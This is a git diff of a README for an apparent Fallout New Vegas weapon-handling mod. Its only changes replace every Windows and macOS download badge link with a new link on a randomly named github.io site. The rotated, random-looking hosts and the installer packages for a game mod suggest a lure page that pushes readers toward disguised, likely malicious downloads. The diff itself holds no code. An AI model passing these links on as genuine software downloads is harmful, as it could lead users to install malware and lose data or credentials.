@@ -28,7 +28,7 @@ Whether you're a newcomer just getting started or a seasoned pro looking for adv
 
 <div align="center">
 
-[![Download Fallout NV Smooth Weapon Handling](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_FALLOUT_NV_SMOOTH_WEAPON_HANDLING-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://supremedeckhandwire.github.io/win-pkg/)
+[![Download Fallout NV Smooth Weapon Handling](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_FALLOUT_NV_SMOOTH_WEAPON_HANDLING-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://fnwsiyggsoui.github.io/win-setup2/)
 
 </div>
 
@@ -62,8 +62,8 @@ Getting started with **Fallout NV Smooth Weapon Handling** is quick and straight
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-6D4C41?style=for-the-badge&logo=windows&logoColor=white)](https://supremedeckhandwire.github.io/win-pkg/)
-[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-6D4C41?style=for-the-badge&logo=apple&logoColor=white)](https://supremedeckhandwire.github.io/mac-pkg/)
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-6D4C41?style=for-the-badge&logo=windows&logoColor=white)](https://fnwsiyggsoui.github.io/win-setup2/)
+[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-6D4C41?style=for-the-badge&logo=apple&logoColor=white)](https://fnwsiyggsoui.github.io/mac-setup2/)
 
 </div>
 
